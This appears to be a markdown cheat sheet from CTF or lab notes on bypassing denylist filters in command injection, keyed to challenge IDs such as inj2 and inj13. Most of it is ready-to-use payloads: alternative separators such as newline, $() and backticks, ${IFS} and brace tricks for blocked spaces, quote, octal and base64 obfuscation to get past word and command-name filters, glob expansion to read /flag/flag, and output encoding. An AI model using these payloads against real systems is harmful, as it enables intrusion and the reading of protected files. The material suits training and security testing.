# Command injection — denylist / filter bypass

Denylists are an arms race the defender loses. First learn **exactly** what is filtered: send each
char alone and see if it's stripped, blocked (403/error) or passed.
```bash
python scripts/injection/charfilter_probe.py "$T/label" --data 'sku=A1&text=FUZZ'
```

## Separator blocked → use another
| Blocked | Try |
|---|---|
| `;` | `%0a` (newline), `%0d%0a`, `&&`, `\|\|`, `\|`, `&` |
| `; \| &` | newline, `$(...)`, backticks |
| `; \| & $ `` ` `` | **newline** (`inj2`) |
| `; \| & $ ` newline `> <` | **glob** `*` `?` `[...]` (argument-only, `inj8`) |
| space | `${IFS}`, `$IFS$9`, `<` (`cat</flag/flag`), `{cat,/flag/flag}`, `%09` (tab) |
| `/` | `${HOME:0:1}`, `$(printf '\57')`, `cd ..;cd ..;cat flag/flag` |

## Word filter (e.g. `flag` blocked)
```bash
cat /fl''ag/fl""ag         cat /fl\ag/fl\ag          cat /f?ag/f?ag    (glob, needs readable dir)
cat /$(printf '\146\154\141\147')/$(printf '\146\154\141\147')       # octal → "flag"
cat /$(printf %b '\146\154\141\147')/$(printf %b '\146\154\141\147')
cat /$(echo ZmxhZw== | base64 -d)/$(echo ZmxhZw== | base64 -d)
a=fl;b=ag;cat /$a$b/$a$b
cat $(ls /*/f*)                                                    # if listable
```
Glob fails on dirs without read (list) permission (`0711`) — use printf/base64 instead (`inj13`).

## Command name filtered (`cat`, `rm`…)
`c''at`, `c\at`, `$'\x63\x61\x74'`, `/bin/c?t`, `tac`, `head`, `tail`, `less`, `more`, `nl`, `od -c`,
`xxd`, `rev`, `sort`, `grep -r . /flag`, `while read l;do echo $l;done</flag/flag`,
`$(xxd -r -p <<< 636174)`.

## Glob = argument expansion (no metacharacters needed)
If only the *argument* is yours and the program is fixed (`ls -la {p} && cat {p}`):
`/flag/*` → shell expands to `/flag/flag`. Also `-` option injection via filenames → [argument-injection](argument-injection.md).

## Output filtered
Encode it: `cat /flag/flag | base64`, `| xxd -p`, `| rev`, or exfil → [cmdi-blind-oob](cmdi-blind-oob.md).

Seen in: `inj2` (strips `; | & $ \``, newline passes), `inj7` (strips `; | &`, `$()` passes),
`inj8` (blacklist, `/flag/*` glob), `inj13` (word `flag` filtered).
